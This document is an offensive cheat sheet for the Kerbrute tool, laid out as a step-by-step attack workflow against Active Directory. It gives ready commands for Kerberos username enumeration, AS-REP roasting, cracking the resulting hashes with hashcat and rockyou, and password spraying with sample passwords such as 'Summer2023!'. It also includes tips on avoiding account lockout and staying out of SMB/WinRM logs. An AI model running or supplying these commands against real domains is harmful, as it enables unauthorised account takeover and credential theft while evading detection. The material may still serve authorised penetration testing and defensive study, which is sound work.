# Kerbrute — Kerberos User Enumeration & AS-REP Roasting

!!! tip "Tip"
    `kerbrute userenum --dc 10.10.10.10 -d example.com userlist.txt` validates usernames without lockout (Kerberos pre-auth errors don't trigger lockout by default). Start with `jsmith`, `john.smith`, `jsmith@domain` format variations — AD environments vary in UPN format.

---

## Syntax

```bash
./kerbrute [command] [flags]
```

---

## Common Commands & Usage

### 1. Enumerate Valid Usernames

```bash
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt
```

Expected output:

```
[+] VALID USERNAME: jdoe@corp.local
[-] INVALID USERNAME: hruser@corp.local
```

Brute-force usernames with a large wordlist:

```bash
kerbrute userenum -d example.com --dc 10.10.10.10 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
```

---

### 2. Find AS-REP Roastable Users

```bash
kerbrute asreproast --dc 10.10.10.10 -d corp.local users.txt
```

Output:

```bash
[+] FOUND AS-REP Roastable User: svc_backup@corp.local
$krb5asrep$23$svc_backup@CORP.LOCAL:...hash...
```

Crack with:

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

---

### 3. Kerberos Password Spraying

```bash
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt --password "Summer2023!"
```

Output:

```plaintext
[+] VALID LOGIN: jdoe@corp.local:Summer2023!
```

> Good for stealthy single-password attempts across many users.

---

## Operational Notes

- Works only if UDP/88 or TCP/88 is reachable
- Does not require domain join or admin rights
- Avoids logging on SMB/WinRM — quieter than `nxc smb` sprays
- Combine with `ldapsearch` or BloodHound output to build user wordlists

---

## Best Practice Workflow

```bash
# Step 1: Enumerate users
kerbrute userenum -d example.com --dc 10.10.10.10 users.txt > valid.txt

# Step 2: Identify AS-REP roastable users
kerbrute asreproast -d example.com --dc 10.10.10.10 valid.txt > roast.txt

# Step 3: Crack hashes offline
hashcat -m 18200 roast.txt rockyou.txt

# Step 4: Try password spraying if needed
kerbrute passwordspray -d example.com --dc 10.10.10.10 valid.txt --password "Welcome1"
```
